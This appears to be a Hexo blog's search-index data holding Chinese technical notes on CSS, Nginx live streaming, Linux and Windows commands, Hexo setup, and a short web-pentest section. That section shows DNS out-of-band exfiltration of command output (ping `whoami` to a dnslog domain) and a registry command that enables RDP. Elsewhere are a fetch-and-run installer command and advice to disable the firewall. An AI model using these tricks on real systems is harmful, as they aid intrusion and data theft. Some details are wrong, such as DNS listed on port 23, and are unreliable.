src=&quot;/images/music/music-start.png&quot;&gt;&lt;/image&gt;  &lt;/view&gt;  在使用 “left”, “top”, “right” 以及 “bottom” 属性之后，位置就不是基于文档流时候的位置，  而是根据这些设置的属性基于整个屏幕的位置确定的。随着滚动并不一直停留在屏幕中。\n\n\nrelative相对定位\n&lt;html&gt;  &lt;head&gt; &lt;style  type=&quot;text/css&quot;&gt;h2.pos_left  &#123;  position:relative;  left:-20px  &#125; h2.pos_right  &#123;  position:relative;  left:20px  &#125; .container&#123;   margin-left:100px;   border:5px solid #405f80;  &#125;&lt;/style&gt;  &lt;/head&gt;  &lt;body&gt;  &lt;div class=&quot;container&quot;&gt;    &lt;h2&gt;这是位于正常位置的标题&lt;/h2&gt;  &lt;h2 class=&quot;pos_left&quot;&gt;这个标题相对于其正常位置向左移动&lt;/h2&gt;  &lt;h2 class=&quot;pos_right&quot;&gt;这个标题相对于其正常位置向右移动&lt;/h2&gt; &lt;/div&gt;  &lt;/body&gt;     &lt;/html&gt;  \n\n\n","categories":["编程基础"],"tags":["HTML","CSS"]},{"title":"搭建Nginx+直播推流平台","url":"/article/%E6%90%AD%E5%BB%BANginx-%E7%9B%B4%E6%92%AD%E6%8E%A8%E6%B5%81%E5%B9%B3%E5%8F%B0/","content":"搭建Nginx环境1、下载Nginx源码包curl http://nginx.org/download/nginx-1.20.1.tar.gz -o nginx-1.20.1.tar.gz\n\n2、解压源码包tar -zxvf nginx-1.20.1.tar.gz -C ../\t# -C指定解压路径\n\n3、配置生成文件（一般修改配置文件、日志文件路径）./configure --conf-path=/etc/nginx/nginx.conf --error-log-path=/var/log/nginx/error.log --http-log-path=/var/log/nginx/access.log --pid-path=/var/lib/nginx/nginx.pid --with-http_v2_module --with-http_realip_module --with-http_flv_module --with-http_mp4_module --with-http_ssl_module\n\n注：需要下载配置环境\n如：\nyum install pcre-devel zlib-devel openssl-devel\n\n4、make编译5、make install安装6、添加nginx到环境变量ln -s /usr/local/nginx/sbin/nginx /usr/local/bin/\n\n（注！ /usr/local/nginx/sbin/nginx为nginx启动文件的绝对路径）\n此时可直接使用nginx命令，如：nginx -s stop停止nginx服务\n7、关闭防火墙systemctl stop firewalldsystemctl disable firewalld\t\t#永久禁用\n\n至此，访问80端口可看到Nginx测试页\n下载任意html静态网站压缩包，解压并复制到Nginx网站路径，即可访问静态网页\n8、其他注意事项/var/lib/mysql\t\t\t\t# mysql数据路径/usr/local/nginx/html\t\t# Nginx默认网站路径/etc/nginx/nginx.conf\t\t# Nginx配置文件\n\n修改root /var/www/html即可改变默认路径\n\nNginx搭建直播推流平台工具：nginx-http-flv-module-master.zip + OBS Studio（pc端）/杏林推流（app端）\n1、源码安装，配置在nginx源码编译基础上，增加–add-module=/home/chen/software/nginx-http-flv-module-master（导入为绝对路径），即：\n./configure --conf-path=/etc/nginx/nginx.conf --error-log-path=/var/log/nginx/error.log --http-log-path=/var/log/nginx/access.log --pid-path=/var/lib/nginx/nginx.pid --with-http_v2_module --with-http_realip_module --with-http_flv_module --with-http_mp4_module --with-http_ssl_module --add-module=/home/chen/software/nginx-http-flv-module-master\n\n2、make、make install3、修改配置文件（/etc/nginx/nginx.conf）\n在http中新增（与最内层函数同级）\nlocation /live &#123;  flv_live on;  chunked_transfer_encoding on;  add_header Access-Control-Allow-Origin *;&#125;\n\n在文件末尾新增（与http函数同级）\nrtmp &#123;\tserver &#123;\t\tlisten 1935; \t\tapplication chen &#123;\t\t\tlive on;\t\t&#125;\t&#125;&#125;\n\n（注！live不可更改，会导致无法加载视频）\n4、检查nginx -t\t\t# 检测配置文件有无语法错误nginx -s reload\t# 重新加载\n\n5、推流设置OBS推流设置（PC）\n\n\n\n说明\n命令\n\n\n\n服务器\nrtmp://139.224.x.x/live/\n\n\n串流密钥\nchen（可更改，类似于密码）\n\n\n杏林推流设置（APP）\nrtmp://139.224.x.x/live/chen\n\n6、观看http://bilibili.github.io/flv.js/demo/\t\t\t#观看视频地址http://139.224.x.x/live?app=live&amp;stream=chen\t#推流视频链接\n","categories":["环境搭建"],"tags":["Nginx","直播推流"]},{"title":"Linux随记","url":"/article/Linux%E9%9A%8F%E8%AE%B0/","content":"网卡配置配置静态IP：vim /etc/sysconfig/network-scripts/ifcfg-eth0 或ifcfg-ens33ONBOOT=yesBOOTPROTO=&quot;static&quot;IPADDR=&quot;192.168.x.x&quot;NETMASK=&quot;255.255.255.0&quot;GATEWAY=&quot;192.168.x.1&quot;ifdown eth0   禁用网卡ifup eth0      启用网卡\n\n配置DNS：vim /etc/resolv.confnameserver 8.8.8.8\n\n其他：arp -a 192.168.x.x 查看ip是否被使用，用来选择静态ip\n常用DNS：\n国内：114.114.114.114、223.5.5.5、119.29.29.29等\n国外：1.1.1.1、8.8.8.8等\n重要目录及文件\n\n\n目录\n说明\n\n\n\n/etc\n存放所有管理系统所需要的配置文件和子目录\n\n\n\n/etc/passwd #存放操作系统用户信息 /etc/shadow #存放操作系统账户密码 /etc/group #存储当前系统中所有用户组信息 /etc/gshadow #存储用户组密码的一类信息 /etc/nginx/nginx.conf # Nginx配置文件 /etc/httpd/conf/httpd.conf # Apache配置文件路径\n\n\n/usr\nLinux系统资源目录，类似Windows下的program files目录\n\n\n\n/usr/local/nginx/html # Nginx默认网站路径\n\n\n/var\n系统运行时需要改变的数据&lt;br /\n\n\n\n/var/log #日志存放目录 /var/spool/cron #计划任务目录，定时执行 /var/lib/mysql # mysql数据路径 /var/www/html # Apache默认网站路径\n\n\n常用解压压缩tar -zxvf file  -C ./dir\t\t\t  \t#解压.tar.gz文件到指定文件夹tar -zcvf ./file  file1 file2\t\t\t#打包压缩成.tar.gz文件，注意，压缩成的文件需要在-f参数后面unzip file\t\t\t\t\t\t\t\t#解压zip文件zip file\t\t\t\t\t\t\t\t#压缩zip文件7za x file.7z -r -o./\t\t\t\t\t#解压7za a -t7z file.7z /opt/fileName/*\t\t#压缩\n\n注：压缩中，-t指定压缩类型，可忽略（默认7z）\n下载使用\nyum install p7zip -y\n\nVI使用\n\n\n命令\n说明\n\n\n\ni、I\ni光标处输入，I所在行第一个非空格符处输入\n\n\na、A\na光标下一个字符处输入，A行末处输入\n\n\no、O\no光标下一新行输入，O光标上一新行输入\n\n\nESC\n命令模式\n\n\nctrl+b\n上翻\n\n\nctrl+f\n下翻\n\n\n0\n移动到行首\n\n\n$\n移动到行尾\n\n\ngg\n移动到文档首\n\n\nG\n移动到文档尾\n\n\n:%s/word1/word2/g\n全局替换word1为word2\n\n\n/word\n向光标之下寻找word字符串\n\n\n?word\n向光标之上寻找word字符串\n\n\nx、X\n剪切\n\n\ndd\n删除整行\n\n\nndd\n删除n行\n\n\nyy\n复制整行\n\n\nnyy\n复制n行\n\n\np、P\np向下粘贴，P向上粘贴\n\n\nu\n撤销，直至还原\n\n\nctrl+r\n撤销，仅限一步\n\n\n.\n重复上一个动作\n\n\n:q\n不保存退出\n\n\n:w\n保存退出\n\n\n:!\n强制执行\n\n\n:! command\n暂时离开vi执行command\n\n\n:set nu\n显示行号\n\n\n:set nonu\n取消显示行号\n\n\n查找命令find / -name &quot;file&quot;  在根目录下查看文件名为file的文件find / -perm &quot;root&quot;  在根目录下查找root权限文件find / -user &quot;root&quot;  在根目录下查找root用户文件\n\n软件安装curl安装（需要有下载路径，本机对服务器的下载）\ncurl _ip/_file -o filename -o可替换为&gt;\nscp上传（需要有源文件，本机对服务器的上传）\nscp：ssh+sftp，占用ssh端口及账号及部分功能，使用sftp协议，进行文件上传\nscp filename root@ip:/_path\nyum安装（需要源网站里面有对应的软件）\n\n\n\n命令\n说明\n\n\n\nyum search\n查找\n\n\nyum install\n安装\n\n\nyum remove\n移除\n\n\nyum update\n升级，可指定升级，也可全部升级\n\n\n注：yum源文件：/etc/yum.repos.d\nwget安装（同curl，但是更简单，速度更快）\nwget _path/_file\n源码安装步骤\n\n\n命令\n说明\n\n\n\n1、tar 解包\n解压缩源码包到指定目录\n\n\n2、./configure\n配置生成makefile文件，可手动配置参数（如安装路径）\n\n\n3、make编译\n生成可执行的二进制文件\n\n\n4、make install安装\n复制二进制文件到系统，配置应用环境（如应用安装路径配置文件）\n\n\n注：configure配置文档（官方文档）\nhttp://nginx.org/en/docs/configure/html\nfirewall防火墙配置\n\n\n命令\n说明\n\n\n\nfirewall-cmd –state\n查看防火墙状态\n\n\nfirewall-cmd –get-active-zones\n查看正在使用的区域及网卡名称\n\n\nfirewall-cmd –list-all-zones\n显示当前预期网卡配置参数、资源、端口及服务等信息\n\n\nfirewall-cmd –zone=public –add-port=80/tcp –permanent\n允许80端口tcp流量通过，永久生效\n\n\nfirewall-cmd –zone=public –add-service=http –permanent\n同上，不同的配置方式\n\n\nfirewall-cmd –zone=public –remove-port=23/udp –permanent\n禁止23端口udp流量通过，永久生效\n\n\nfirewall-zone –zone=public –remove-service=dns –permanent\n同上，不同配置方式\n\n\n常用端口服务：\n\n\n\n服务\n端口\n\n\n\nhttp\n80/tcp\n\n\nhttps\n443/tcp\n\n\ndns\n23/udp\n\n\nmysql\n3306/tcp\n\n\nssh\n22/tcp\n\n\n安装Python3sudo yum install epel-releasesudo yum install python36\n\n\n\n查看linux版本uname -acat /proc/version\n\n","categories":["Linux"],"tags":["随记"]},{"title":"Windows随记","url":"/article/Windows%E9%9A%8F%E8%AE%B0/","content":"\n\n\n命令\n说明\n\n\n\nnetstat -r\n列出当前路由信息\n\n\ndir\n显示文件列表，同linux下ls\n\n\nmkdir或mk\n创建目录\n\n\nrmdir或rd\n删除目录\n\n\ncopy\n复制，需要指定目录\n\n\ndel\n删除\n\n\ntouch\n创建文件\n\n\nren\n重命名\n\n\ntype\n查看文本文件\n\n\n文件查找\nfor /r c:/ %i in (*.png) do @echo %i\t\t#搜索C盘下包含png后缀的文件for /r c:/ %i in (*user*) do @echo %i\t\t#搜索C盘下包含user关键词的文件\n\n\n\nchoco安装检查\nGet-ExecutionPolicy\n\n如果返回的是 Restricted，那么需要更改为Bypass或AllSigned\n修改\nSet-ExecutionPolicy AllSigned或Set-ExecutionPolicy Bypass -Scope Process\n\n安装\nSet-ExecutionPolicy Bypass -Scope Process -Force; iex ((New-Object System.Net.WebClient).DownloadString(&#x27;https://chocolatey.org/install.ps1&#x27;))\n\n修改安装路径\n打开注册表regedit\n修改\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\n\n中的ProgramFilesDir和ProgramFilesDir (x86)的值为指定路径\n查看cpu及内存使用1、查看内存占用情况wmic OS get FreePhysicalMemory2、查看系统内存总数wmic ComputerSystem get TotalPhysicalMemory3、查看CPU占用情况wmic cpu get loadpercentage\n\n\n\npowershell位置C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\n","categories":["Windows"],"tags":["随记"]},{"title":"Web渗透随记","url":"/article/Web%E6%B8%97%E9%80%8F%E9%9A%8F%E8%AE%B0/","content":"DNS外带平台：\nhttp://dnslog.cn/ #需要生成随机DNS\n使用：\nping `whoami`.dns\n\n（注：``为优先运行符，可以用$()代替）\n适用：\n注入、反序列化、命令执行等无回显情况下，外带数据看结果\nWindows开启3389端口注：Win7、Win2003、XP系统\n开启：\nREG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\n\n关闭：\nREG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f\n","categories":["Web渗透"],"tags":["随记"]},{"title":"搭建hexo博客","url":"/article/%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2/","content":"一、简介Github Pages\nGitHub Pages 是由 GitHub 官方提供的一种免费的静态站点托管服务，让我们可以在 GitHub 仓库里托管和发布自己的静态网站页面。\nHexo\nHexo 是一个快速、简洁且高效的静态博客框架，它基于 Node.js 运行，可以将我们撰写的 Markdown 文档解析渲染成静态的 HTML 网页。\n二、环境准备Nodejs + Git + Github账号\n（可用choco install nodejs git一键安装）\n三、安装1、连接github账户\n\n\n操作\n命令\n\n\n\n设置用户名邮箱\ngit config –global user.name “zeroChen00” git config –global user.email “1652560938@qq.com“\n\n\n创建SSH密匙\nssh-keygen -t rsa -C “1652560938@qq.com“（全部回车）\n\n\n添加密匙\n1、复制 [C:\\Users\\用户名.ssh\\id_rsa.pub]中密匙 2、Github-Setting-SSH and GPG keys-New SSH key，新建Key，贴入密匙\n\n\n验证连接\nssh -T git@github.com（yes确认） 显示 “Hi xxx! You’ve successfully……” 即连接成功\n\n\n2、创建Github Pages仓库Github - 加号 - New repository - Repository name 中输入 用户名.github.io - 创建\n（注意！仓库用户名需要与github用户名保持一致，否则无法访问）\n3、本地安装Hexo博客程序\n\n\n操作\n命令\n\n\n\n使用npm安装Hexo\nnpm install -g hexo-cli\n\n\n验证安装\nhexo -v\n\n\n初始化\nhexo init\n\n\n安装组件\nnpm install\n\n\n生成页面\nhexo g\n\n\n启动预览\nhexo s\n\n\n访问http://localhost:4000\n出现hexo默认界面则安装成功\n\n\n（注：hexo server -p 5000可更改端口，默认4000）\n4、部署Hexo到Github Pages\n\n\n操作\n命令\n\n\n\n安装hexo-deployer-git\nnpm install hexo-deployer-git –save\n\n\n修改 _config.yml 文件末尾的Deployment 部分\ndeploy: type: git repository: git@github.com:zeroChen00/zeroChen00.github.io.git branch: master\n\n\n上传部署\nhexo d\n\n\n访问Giuhub静态博客\nhttps://zeroChen00.github.io/\n\n\n（注意！hexo中所有代码操作，冒号后均要跟一个空格，负责不生效！）\n四、主题配置\n\n\n操作\n命令\n\n\n\n下载\ngit clone https://github.com/theme-kaze/hexo-theme-kaze.git themes/kaze\n\n\n修改全局配置文件_config.yml\ntheme: kaze\n\n\n新建页面\nhexo new page “about”\n\n\n搜索\nsearch: enable: true path: search.json field: posts searchContent: true\n\n\n其他配置\nhttps://demo.theme-kaze.top/document/\n\n\n开启评论\n1、注册OAuth application2、修改主题配置文件\n\n\n语句如下\ngitalk:     enable: true #是否开启    clientID: &#x27;e231ce2...&#x27;    clientSecret: &#x27;2fb4635367c...&#x27;    repo: &#x27;zeroChen00.github.io&#x27;    owner: &#x27;zeroChen00&#x27;    admin: [&#x27;zeroChen00&#x27;]    id: location.href    distractionFreeMode: true    # en | zh-CN | zh-TW    # language: navigator.language || navigator.userLanguage    language: zh-CN    labels: [&#x27;Gitalk&#x27;]    perPage: 10\n\n五、图片无法显示问题根目录配置文件开启post_asset_folder: true（typora的需要配置文件上传路径为相同路径）\n使用相对路径引用文件即可\n六、使用\n\n\n操作\n命令\n\n\n\n1、写博客\nhexo new “My New Post” source 文件夹中会出现一个 My New Post.md 文件\n\n\n或贴入.md文件（需要增加文件头）\n— title: Hello World # 标题 date: 2019/3/26 hh:mm:ss # 时间 categories: # 分类 - Diary tags: # 标签 - PS3 - Games —\n\n\n2、更新并发布静态博客\nhexo g # 生成页面 hexo d # 部署发布\n\n\n3、更改配置\n_config.yml文件（修改时:后跟一个空格）\n\n\n4、更换主题\nhttps://hexo.io/themes/ git clone file ./themes/file 根据主题介绍进行下载并配置config.yml文件（更改主题名称等）\n\n\n","categories":["附加技能"],"tags":["博客"]}]